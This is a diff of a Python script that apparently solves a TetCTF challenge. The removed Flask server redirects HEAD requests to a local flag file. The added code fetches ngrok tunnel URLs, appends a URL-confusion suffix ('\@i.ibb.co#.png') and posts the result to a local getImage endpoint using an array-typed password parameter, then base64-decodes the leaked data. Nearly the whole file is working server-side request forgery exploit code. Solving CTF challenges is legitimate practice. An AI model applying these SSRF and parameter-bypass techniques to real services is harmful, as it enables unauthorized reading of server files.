@@ -1,24 +1,21 @@
-from flask import Flask, redirect, request, make_response
-import socket
+import json
+import subprocess
+import os
+import pybase64
 
-app = Flask(__name__)
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(("8.8.8.8", 80))
-local_ip = s.getsockname()[0]
+os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
 
-@app.route('/')
-def hello_world():
-    return 'Hello World from Thắng'
+with open('tunnels.json') as data_file:    
+    datajson = json.load(data_file)
 
-# @app.route('/', defaults={'path': ''})
-# @app.route('/<path:path>')
-# def catch_all(path):    
-#     if request.method == 'HEAD':
-#         resp = make_response("Foo bar baz")
-#         resp.headers['Content-type'] = 'image'
-#         return resp
-#     else:
-#         return redirect("file:///usr/src/app/fl4gg_tetCTF")
-    
-if __name__ == '__main__':
-    app.run(debug=True, port=8000, host=local_ip)
+msg = ""
+for i in datajson['tunnels']:
+  msg = msg + i['public_url']
+
+url = msg + "\@i.ibb.co#.png"
+curl_cmd = "curl -d 'url=" + url + "' -X POST 'http://localhost:2023/api/getImage?password[]=Th!sIsS3xreT0'"
+data = subprocess.check_output(curl_cmd, shell=True)
+datajson = json.loads(data)
+datadecode = pybase64.standard_b64decode(datajson["data"])
+
+print(datadecode)
